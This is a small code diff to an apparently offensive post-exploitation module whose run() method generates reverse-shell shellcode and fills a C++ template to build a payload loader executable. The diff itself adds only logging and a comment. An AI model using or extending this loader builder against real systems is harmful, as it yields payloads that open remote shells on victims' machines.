@@ -6,6 +6,7 @@
 import time
 
 from Lib.ModuleAPI import *
+from Lib.log import logger
 
 
 class PostModule(PostPythonModule):
@@ -43,10 +44,11 @@ class PostModule(PostPythonModule):
         return True, None
 
     def run(self):
-        loadername = self.param("LoaderName")
+        loadername = self.param("LoaderName")  # abcd.exe
         shellcode = self.generate_hex_reverse_shellcode_by_handler()
         FUNCTION = self.random_str(8)
         FUNCTION1 = self.random_str(9)
+        logger.info("生成c++源码")
         source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode, FUNCTION=FUNCTION,
                                                         LOADERFILE=loadername)
 
